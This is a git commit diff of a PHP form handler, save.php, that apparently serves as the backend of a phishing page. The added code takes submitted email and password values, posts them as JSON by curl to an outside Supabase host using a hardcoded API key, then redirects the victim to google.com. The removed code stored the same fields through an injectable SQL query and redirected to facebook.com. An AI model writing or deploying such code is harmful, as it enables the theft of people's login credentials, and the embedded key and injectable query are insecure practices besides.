ce076c09095377bce042841caa553e476fd1881f
linksprofile-cmd <linksprofile20@gmail.com>
2026-06-24 00:28:34 +0100

    save.php

--- save.php
+++ save.php
@@ -1,39 +1,32 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-include "db.php";
-
 $email = $_POST['email'];
 $password = $_POST['password'];
 
-$sql = "INSERT INTO submissions(email, password)
-VALUES('$email', '$password')";
+$url = "https://ptshthtnjcbngiceyjzc.supabase.co";
 
-if ($conn->query($sql) === TRUE) {
-    header("Location: https://facebook.com");
-    exit();
-} else {
-    echo "Error: " . $conn->error;
-}
+$data = array(
+    "email" => $email,
+    "password" => $password
+);
 
+$payload = json_encode($data);
+
+$ch = curl_init($url);
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    "Content-Type: application/json",
+    "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
+    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
+    "Prefer: return=minimal"
+));
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+// redirect after submit
+header("Location: https://google.com");
+exit();
 ?>
-
-
-/* <?php
-
-include "db.php";
-
-$email = $_POST['email'];
-$password = $_POST['password'];
-
-$sql = "INSERT INTO submissions(email, password)
-VALUES('$email', '$password')";
-
-if ($conn->query($sql) === TRUE) {
-    header("Location: index.php");
-} else {
-    echo "Error saving data";
-}
-
-?> */
